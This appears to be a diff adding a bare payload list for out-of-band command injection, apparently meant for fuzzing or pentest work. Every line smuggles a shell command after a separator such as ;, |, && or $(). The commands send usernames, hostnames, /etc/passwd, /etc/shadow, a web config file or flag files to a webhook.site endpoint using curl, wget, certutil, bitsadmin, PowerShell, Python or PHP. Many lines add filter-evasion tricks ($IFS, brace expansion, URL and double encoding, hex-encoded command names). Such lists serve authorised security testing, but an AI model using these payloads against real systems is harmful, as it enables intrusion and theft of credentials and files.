@@ -1,0 +1,72 @@
+; curl http://webhook.site/test/`whoami`
+| curl http://webhook.site/test/`whoami`
+& curl http://webhook.site/test/`whoami`
+&& curl http://webhook.site/test/`whoami`
+|| curl http://webhook.site/test/`whoami`
+`curl http://webhook.site/test/$USER`
+$(curl http://webhook.site/test/%USERNAME%)
+; wget http://webhook.site/test/$(hostname)
+| wget http://webhook.site/test/$(hostname)
+& wget http://webhook.site/test/$(hostname)
+&& wget http://webhook.site/test/$(hostname)
+|| wget http://webhook.site/test/$(hostname)
+; curl -X POST -d @/etc/passwd http://webhook.site/test
+| curl -X POST -d @/etc/passwd http://webhook.site/test
+; wget --post-file /etc/passwd http://webhook.site/test
+; curl -F "file=@/etc/shadow" http://webhook.site/test
+| curl -F "file=@/etc/shadow" http://webhook.site/test
+; curl http://webhook.site/test?user=$(whoami)&host=$(hostname)
+; curl http://webhook.site/test/%USERNAME%
+| curl http://webhook.site/test/%USERNAME%
+& curl http://webhook.site/test/%USERNAME%
+; certutil -urlcache -f http://webhook.site/test/%COMPUTERNAME% %TEMP%\out.txt
+| certutil -urlcache -f http://webhook.site/test/%USERNAME% %TEMP%\out.txt
+; powershell Invoke-WebRequest -Uri http://webhook.site/test/$env:USERNAME
+| powershell Invoke-WebRequest -Uri http://webhook.site/test/$env:COMPUTERNAME
+; bitsadmin /transfer job /download /priority high http://webhook.site/test C:\out.txt
+; curl -X POST --data-binary @/etc/passwd http://webhook.site/test
+| curl -X POST --data-binary @/etc/shadow http://webhook.site/test
+; curl -F "file=@/etc/hostname" http://webhook.site/test
+; wget --post-file /etc/passwd http://webhook.site/test
+| wget --post-file /etc/shadow http://webhook.site/test
+; cat /etc/passwd | curl -X POST --data-binary @- http://webhook.site/test
+| cat /var/www/html/config.php | curl -X POST --data-binary @- http://webhook.site/test
+; python3 -c "import urllib.request; urllib.request.urlopen('http://webhook.site/test', open('/etc/passwd').read().encode())"
+| php -r "file_get_contents('http://webhook.site/test/?' . file_get_contents('/etc/passwd'));"
+; type C:\Users\Administrator\Desktop\flag.txt | certutil -urlcache -f http://webhook.site/test
+| type C:\Windows\win.ini | powershell Invoke-WebRequest -Uri http://webhook.site/test -Method POST -Body (Get-Content -Raw)
+; powershell \$wc=New-Object System.Net.WebClient;\$wc.UploadFile('http://webhook.site/test','C:\Users\Administrator\Desktop\flag.txt')
+;cat$IFS/etc/passwd$IFS|$IFScurl$IFS-X$IFSPOST$IFS--data-binary$IFS@-$IFShttp://webhook.site/test
+|{curl,http://webhook.site/test}
+;{curl,http://webhook.site/test}
+;%09curl%09http://webhook.site/test
+;curl$IFShttp://webhook.site/test
+|curl$IFShttp://webhook.site/test
+; $(echo -e '\x63\x75\x72\x6c') http://webhook.site/test
+; /???/?url http://webhook.site/test
+| a=curl;b=http://webhook.site/test;$a $b
+; a=cu;b=rl;$a$b http://webhook.site/test
+; bash <<< 'curl http://webhook.site/test/$(whoami)'
+| bash <<< 'curl http://webhook.site/test/$(whoami)'
+; $(curl http://webhook.site/test?cmd=$(id))
+| $(curl http://webhook.site/test?cmd=$(whoami))
+; $(curl http://webhook.site/test?cmd=$(cat /etc/passwd | base64))
+| $(wget http://webhook.site/test?cmd=$(hostname))
+| $(curl http://webhook.site/test/$(echo $(whoami)))
+;%0Acurl%0Ahttp://webhook.site/test
+|%0Acurl%0Ahttp://webhook.site/test
+%3Bcurl%20http://webhook.site/test
+%7Ccurl%20http://webhook.site/test
+%26curl%20http://webhook.site/test
+%257Ccurl%2520http://webhook.site/test
+%253Bcurl%2520http://webhook.site/test
+;%00curl%00http://webhook.site/test
+; /usr/bin/curl http://webhook.site/test
+; powershell Invoke-WebRequest -Uri http://webhook.site/test/$env:COMPUTERNAME
+| powershell Invoke-WebRequest -Uri http://webhook.site/test/$env:USERNAME
+; certutil -urlcache -split -f http://webhook.site/test C:\Windows\Temp\out.txt
+| bitsadmin /transfer job /download /priority high http://webhook.site/test C:\out.txt
+; powershell \$wc=New-Object System.Net.WebClient;\$wc.DownloadString('http://webhook.site/test/'+\$env:COMPUTERNAME)
+; curl http://webhook.site/test?cmd=$(id | base64)
+| curl http://webhook.site/test?cmd=$(whoami | base64)
+; curl http://webhook.site/test?cmd=$(cat /etc/passwd | base64 -w0)
